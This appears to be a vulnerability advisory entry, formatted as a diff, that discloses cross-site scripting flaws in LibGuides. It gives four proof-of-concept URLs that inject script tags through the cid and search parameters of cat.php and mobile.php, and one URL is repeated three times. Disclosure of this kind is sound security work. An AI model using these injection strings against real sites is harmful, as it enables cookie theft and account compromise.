@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/55222/info
+
+LibGuides is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks. 
+
+http://www.example.com/cat.php?cid=%22%3E%3Cscript%3Ealert(0);%3C/script%3E
+
+http://www.example.com/cat.php?cid=%22%3E%3Cscript%3Ealert(0);%3C/script%3E
+
+http://www.example.com/cat.php?cid=%22%3E%3Cscript%3Ealert(0);%3C/script%3E
+
+http://www.example.com/mobile.php?action=8&gid=&iid=145&search=%22%3E%3Cscript%3Ealert(0);%3C/script%3E 
